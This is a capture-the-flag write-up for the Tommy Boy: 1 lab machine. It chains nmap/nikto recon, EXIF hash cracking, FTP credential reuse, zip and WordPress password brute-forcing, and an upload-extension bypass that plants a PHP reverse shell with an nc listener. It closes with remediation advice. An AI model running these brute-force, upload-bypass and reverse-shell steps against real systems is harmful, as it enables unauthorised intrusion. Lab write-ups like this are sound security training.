# Tommy Boy: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.108 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | Collect 5 flags and unlock the final message; restore the company website |
| **Source** | [HackingArticles](https://www.hackingarticles.in/hack-tommyboy-vm-ctf-challenge/) |

## Attack Summary

Tommy Boy: 1 is a story-driven CTF based on the movie "Tommy Boy" and the fictitious company "Callahan Auto," created by Brian Johnson of 7 Minute Security. The challenge requires finding 5 flags hidden across the system and combining them into a password to unlock a final zip archive. The attack chain involves: robots.txt discovery, WordPress enumeration, EXIF steganography, FTP credential reuse, User-Agent spoofing, custom wordlist generation, zip cracking, WordPress brute-force, SSH login, website backup restoration, and a file upload bypass for a reverse shell.

## Methodology

1. Nmap + Nikto web enumeration
2. robots.txt and page source analysis
3. WordPress enumeration and EXIF metadata extraction
4. MD5 cracking and password-protected blog access
5. Full port scan to find hidden FTP (non-standard port)
6. FTP credential reuse and file retrieval
7. User-Agent spoofing to access iPhone-restricted page
8. dirb brute-force with custom User-Agent for hidden HTML file
9. Custom wordlist with crunch + zip cracking with fcrackzip
10. WordPress admin brute-force with wpscan
11. SSH access and website restoration
12. File upload bypass (extension rename) for reverse shell
13. Flag collection and final zip unlock

---

## Step 1: Reconnaissance

```bash
nmap -A $TARGET
```

![nmap](images/01-nmap.png)

**Open ports:**
- 22/tcp — SSH
- 80/tcp — HTTP (Callahan Auto "under construction" page)
- 8008/tcp — HTTP (restricted content)

---

## Step 2: Flag 1 — robots.txt

Run Nikto against the web server:

```bash
nikto -h http://$TARGET/
```

Nikto reveals a `robots.txt` file. Fetch it:

```bash
curl http://$TARGET/robots.txt
```

![robots](images/02-robots.png)

**Flag 1:** `B34rcl4ws`

---

## Step 3: Discovering the WordPress Site

View the source of the main page — a YouTube link is embedded. The video title hints at "prehistoric forest." Append this as a path:

```bash
curl http://$TARGET/ | grep -i youtube
# Navigate to: http://$TARGET/prehistoricforest
```

The WordPress site at `/prehistoricforest` contains:
- A text file with Flag 2: `http://$TARGET/prehistoricforest/thisisthesecondflagyayyou.txt`
- A clue to visit `/richard`

**Flag 2:** `Z4l1nsky`

---

## Step 4: EXIF Steganography — Password for Protected Blog

```bash
# Browse: http://$TARGET/richard/shockedrichard.jpg
exiftool shockedrichard.jpg
# Note the MD5 hash in the EXIF data
```

Crack the MD5 hash (e.g., via crackstation.net):

```
ce154b5a8e59c89732bc25d6a2e6b90b → spanky
```

Go back to the WordPress `/prehistoricforest` page, click the password-protected post, and enter `spanky`. The blog reveals two key hints:

1. Username: **nickburns** (with an FTP service on a non-standard port that cycles every 15 minutes)
2. Look at the source of pages for further clues

---

## Step 5: Full Port Scan — Hidden FTP

The standard nmap scan missed the FTP server. Run a full port scan:

```bash
nmap -p- -sV $TARGET --open
```

FTP is found on **port 65534**. Log in with username-as-password:

```bash
ftp $TARGET 65534
# Username: nickburns
# Password: nickburns
```

```bash
get readme.txt
cat readme.txt
```

The readme mentions a subfolder `NickizL33t`.

---

## Step 6: Flag 3 — iPhone User-Agent and Hidden HTML File

Port 8008 returns a message: "only me and Steve Jobs are allowed to look at this stuff." Spoof an iPhone User-Agent:

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" \
  http://$TARGET:8008/NickIzL33t/
```

The page hints at a hidden `.html` file. Brute-force it with the iPhone User-Agent:

```bash
dirb http://$TARGET:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt \
  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" \
  -X .html
```

Found: `fallon1.html`

```bash
curl -A "Mozilla/5.0 (iPhone; ...)" http://$TARGET:8008/NickIzL33t/fallon1.html
```

![flag3](images/03-flag3.png)

**Flag 3:** `TinyHead`

Also note: a zip file `t0msp4ssw0rdz.zip` is available for download, and there is a hint file at `/NickIzL33t/hint.txt`.

---

## Step 7: Cracking the Zip File

The hint file describes the password pattern:
- Starts with `bev`
- 1 uppercase letter
- 2 digits
- 2 lowercase letters
- 1 symbol
- Ends with `1995`

Generate the wordlist with crunch:

```bash
crunch 13 13 -t bev,%%@@^1995 -o /tmp/dict.txt
```

Crack the zip:

```bash
fcrackzip -u -D -p /tmp/dict.txt t0msp4ssw0rdz.zip
# Password: bevH00tr$1995

unzip t0msp4ssw0rdz.zip
cat passwords.txt
```

The file contains partial credentials:
- **Username:** `bigtommysenior`
- **Password:** `fatguyinalittlecoat` (+ unknown digits)

---

## Step 8: Flag 4 — WordPress Admin and SSH Access

Enumerate WordPress users:

```bash
wpscan -u http://$TARGET/prehistoricforest/ --enumerate u
```

Brute-force user `tom`:

```bash
wpscan -u http://$TARGET/prehistoricforest/ \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --username tom
# Password: tomtom1
```

Log in to WordPress admin at `http://$TARGET/prehistoricforest/wp-admin`. Open the draft post titled **my-ess-ess-eight-password** (read as "my SSH password"). The draft reveals the full password for `bigtommysenior`:

**SSH credentials:** `bigtommysenior` / `fatguyinalittlecoat1938!!`

```bash
ssh bigtommysenior@$TARGET
# Password: fatguyinalittlecoat1938!!
ls -la
cat el-flag-numero-quatro.txt
```

![flag4](images/04-flag4.png)

**Flag 4:** `EditButton`

### Website Restoration (Primary Objective)

```bash
cp callahanbak.bak /var/www/html/index.html
```

Browse `http://$TARGET/index.html` to confirm the Callahan Auto homepage is restored.

---

## Step 9: Flag 5 — File Upload Bypass and Reverse Shell

View the source of `fallon1.html` — it contains a hidden directory: `P4TCH_4D4MS`.

```bash
curl -A "iPhone UA" "http://$TARGET:8008/NickIzL33t/P4TCH_4D4MS/"
```

There is a file upload form. The form only accepts JPEG/PNG/GIF by extension. Rename a PHP reverse shell to bypass:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.png
# Edit $ip and $port in the .png file before uploading
```

Upload `php-reverse-shell.png`. Then, using SSH access as `bigtommysenior`, rename the file:

```bash
cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
mv php-reverse-shell.png php-reverse-shell.php
```

Start the listener and trigger the shell:

```bash
# Attacker
nc -lvnp $LPORT
```

```
http://$TARGET:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php
```

```bash
ls -la
cat .5.txt
```

![flag5](images/05-root-flag.png)

**Flag 5:** `Buttcrack`

---

## Step 10: Final Message — Unlock LOOT.zip

Concatenate all flags as a single string (no spaces or separators):

```
B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
```

Unzip the `LOOT.zip` archive (found in the web directory) with this password:

```bash
unzip LOOT.zip
# Password: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
cat THE-END.txt
```

---

## Lessons Learned

1. robots.txt, page source comments, and EXIF metadata are common CTF and real-world information disclosure vectors.
2. Non-standard port services (FTP on 65534) are frequently missed by default nmap scans — always follow up with a full `-p-` scan.
3. File upload filters based solely on extension are trivially bypassed by renaming; filter by MIME type and magic bytes instead.
4. WordPress draft posts and private comments can expose sensitive internal data if admin credentials are weak.
5. Credential reuse (username = password) remains a prevalent and exploitable pattern.

## Remediation

| Vulnerability | Fix |
|---|---|
| robots.txt Exposure | Remove sensitive paths from robots.txt; use access controls instead |
| EXIF Metadata with Hashes | Strip EXIF metadata before publishing images |
| FTP Credential Reuse | Enforce strong, unique passwords; disable FTP in favour of SFTP |
| File Upload Extension Bypass | Validate by MIME type and magic bytes; store uploads outside the web root; disable script execution in upload directories |
| Weak WordPress Password | Enforce strong password policy; enable MFA for wp-admin |
